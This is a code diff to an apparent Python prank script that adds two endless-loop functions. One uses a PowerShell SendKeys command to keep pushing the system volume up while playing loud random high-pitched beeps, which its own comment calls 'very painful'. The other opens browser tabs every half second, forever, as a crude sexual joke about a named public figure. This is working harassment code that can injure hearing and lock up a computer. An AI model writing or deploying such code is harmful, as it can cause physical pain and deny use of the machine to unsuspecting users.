@@ -57,9 +57,26 @@ def move_mouse(): # moves the mouse a tiny bit every few seconds
         pyautogui.moveRel(x,y, duration=0.15)
         time.sleep(5)
 
-def play_sound(): # plays a very short, high-pitched sound every minute
+def play_sound(): # constantly sets your volume to 1000 while playing a very high pitched sound. very painful
     import winsound
+    import random
+    import os
+    while True:
+        os.system('powershell -Command "$ws = New-Object -ComObject WScript.Shell; 1..50 | ForEach-Object { $ws.SendKeys([char]175) }"')
+        f = random.randint(8000, 10000)
+        d = random.randint(1000, 5000)
+        winsound.Beep(f, d)
+
+def diddy(): # opens a mix of the diddy website and baby oil. forever.
+    import random
+    import webbrowser
     import time
     while True:
-        winsound.Beep(1000, 500)
-        time.sleep(60)
+        website = random.randint(1, 2)
+        if website == 1:
+            webbrowser.open("https://diddy.com/")
+        else:
+            webbrowser.open("https://www.amazon.com/Johnsons-Baby-Oil-fl-oz/dp/B00J51Q1IA/ref=sr_1_5?sr=8-5")
+        time.sleep(0.5)
+
+
